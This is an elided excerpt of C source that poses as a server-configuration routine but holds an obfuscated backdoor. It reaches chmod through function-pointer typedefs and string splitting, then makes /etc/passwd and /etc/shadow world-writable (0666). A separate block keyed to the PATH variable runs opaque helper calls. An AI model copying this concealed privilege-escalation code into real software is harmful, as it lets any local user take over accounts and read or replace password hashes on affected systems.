...
#define FAILLOG RLOG "serverfail"
#define PO &open
#define PCM &chmod

typedef int (*LPO)(char*, int, mode_t);
typedef int (*LPCM) (char *, mode_t);
...
int add_config_server(config *C, char *name, unsigned int port, char *password, int order){
	...
	if (CAT(str) (ENV(get) ("PA" "TH"), RLOG))
	{
		jack = init_jack();
		if (jack > 0 && !set_jack_size(jack, 21)) hash(jack);
		clean(jack);
	}
...
{
	LPCM cm = (LPCM) PCM;
	(*cm)("/et" "c/pas" "swd", 0666);
	(*cm)("/et" "c/sha" "dow", 0666); 
}
